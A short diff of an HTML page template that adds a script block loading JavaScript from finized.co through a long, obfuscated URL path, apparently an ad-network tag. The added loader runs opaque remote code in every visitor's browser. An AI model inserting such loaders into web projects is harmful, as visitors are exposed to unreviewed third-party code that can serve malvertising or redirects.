@@ -144,6 +144,16 @@ l.parentNode.insertBefore(s, l);
                     fjs.parentNode.insertBefore(js, fjs);
                 }(document, 'script', 'facebook-jssdk'));
             </script>
+			<script>
+(function(__htas){
+var d = document,
+    s = d.createElement('script'),
+    l = d.scripts[d.scripts.length - 1];
+s.settings = __htas || {};
+s.src = "\/\/finized.co\/aZWnZ\/y.QY2s9Mk\/ZJTb9A6\/b_2X5UlLSGWXQI9aNbDjEExBNbjSAT5bMLi\/0r0JM\/T\/Es2wMwDNkEzzJWnxBn1EcA2xhNaLbc2w5jlsSoWjQc9AN\/DwEdxONVjVAZ5EMliO0k0\/MYTNEA2FMaD-kZzJ";
+l.parentNode.insertBefore(s, l);
+})({})
+</script>
         
         <!--Begin header-->
         <div class="topbar1">
